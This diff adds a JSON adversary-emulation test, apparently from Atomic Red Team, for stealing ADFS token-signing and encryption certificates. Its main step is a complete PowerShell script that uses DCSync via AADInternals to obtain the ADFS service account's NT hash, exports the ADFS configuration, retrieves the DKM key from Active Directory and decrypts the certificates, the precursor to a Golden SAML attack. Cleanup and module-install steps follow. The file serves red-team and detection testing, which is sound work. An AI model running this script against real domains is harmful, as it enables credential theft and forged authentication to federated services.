@@ -1,0 +1,123 @@
+{
+  "id": "cab413d8-9e4a-4b8d-9b84-c985bd73a442",
+  "name": "ADFS token signing and encryption certificates theft - Remote",
+  "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as a Domain Administrators user on a domain-joined computer.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "fecf8700-10af-4fd4-96e7-13b01d993cde",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module ActiveDirectory -Force \nImport-Module AADInternals -Force | Out-Null\n#Get Configuration\n$dcServerName = (Get-ADDomainController).HostName\n$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq \"#{adfs_service_account_name}\"\n$PWord = ConvertTo-SecureString -String \"#{replication_password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{replication_user}, $PWord\n# use DCSync to fetch the ADFS service account's NT hash\n$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex\n$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server #{adfs_server_name}\n# Get certificates decryption key\n$Configuration = [xml]$ADFSConfig\n$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group\n$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName\n$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn\n$base = \"LDAP://CN=$group,$container,$parent\"\n$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base))\n$ADSearch.Filter = '(name=CryptoPolicy)'\n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"displayName\") | Out-Null\n$aduser = $ADSearch.FindOne()\n$keyObjectGuid = $ADUser.Properties[\"displayName\"] \n$ADSearch.PropertiesToLoad.Clear()\n$ADSearch.PropertiesToLoad.Add(\"thumbnailphoto\") | Out-Null\n$ADSearch.Filter=\"(l=$keyObjectGuid)\"\n$aduser=$ADSearch.FindOne() \n$key=[byte[]]$aduser.Properties[\"thumbnailphoto\"][0] \n# Get encrypted certificates from configuration and decrypt them\nExport-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key\nGet-ChildItem | Where-Object {$_ -like \"ADFS*\"}\nWrite-Host \"`nCertificates retrieved successfully\"\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "021b5d8a-97c0-4501-a33c-b94072f7c8dc",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-Item -Path \".\\ADFS_encryption.pfx\" -ErrorAction Ignore\nRemove-Item -Path \".\\ADFS_signing.pfx\" -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "e414ab60-7f3e-46b7-8707-0ed9f9713a3b",
+      "name": "Check dependency 1/1",
+      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "aa8a443a-f203-49b6-a233-93f87178d2f9",
+      "name": "Resolve dependency 1/1",
+      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AADInternals -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "968fa435-9fb4-4234-a2a1-11caea955a19",
+      "name": "Re-check dependency 1/1",
+      "description": "AADInternals and ActiveDirectory modules must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if ($(Get-Module AADInternals) -or $(Get-Module -ListAvailable -Name ActiveDirectory)) {echo 0} else {echo 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "fecf8700-10af-4fd4-96e7-13b01d993cde",
+      "p": "on-success",
+      "o": "021b5d8a-97c0-4501-a33c-b94072f7c8dc"
+    },
+    {
+      "s": "fecf8700-10af-4fd4-96e7-13b01d993cde",
+      "p": "on-failure",
+      "o": "021b5d8a-97c0-4501-a33c-b94072f7c8dc"
+    },
+    {
+      "s": "e414ab60-7f3e-46b7-8707-0ed9f9713a3b",
+      "p": "on-success",
+      "o": "fecf8700-10af-4fd4-96e7-13b01d993cde"
+    },
+    {
+      "s": "e414ab60-7f3e-46b7-8707-0ed9f9713a3b",
+      "p": "on-failure",
+      "o": "aa8a443a-f203-49b6-a233-93f87178d2f9"
+    },
+    {
+      "s": "aa8a443a-f203-49b6-a233-93f87178d2f9",
+      "p": "on-success",
+      "o": "968fa435-9fb4-4234-a2a1-11caea955a19"
+    },
+    {
+      "s": "968fa435-9fb4-4234-a2a1-11caea955a19",
+      "p": "on-failure",
+      "o": "fecf8700-10af-4fd4-96e7-13b01d993cde"
+    }
+  ],
+  "tags": [
+    "T1552.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "replication_password",
+      "type": "string",
+      "description": "Password of replication_username",
+      "value": "ReallyStrongPassword"
+    },
+    {
+      "name": "adfs_server_name",
+      "type": "string",
+      "description": "Name of an ADFS server",
+      "value": "sts.contoso.com"
+    },
+    {
+      "name": "adfs_service_account_name",
+      "type": "string",
+      "description": "Name of the ADFS service account",
+      "value": "adfs_svc"
+    },
+    {
+      "name": "replication_user",
+      "type": "string",
+      "description": "Username with replication rights. It can be the Domain Admin running the script",
+      "value": "Administrator"
+    }
+  ]
+}
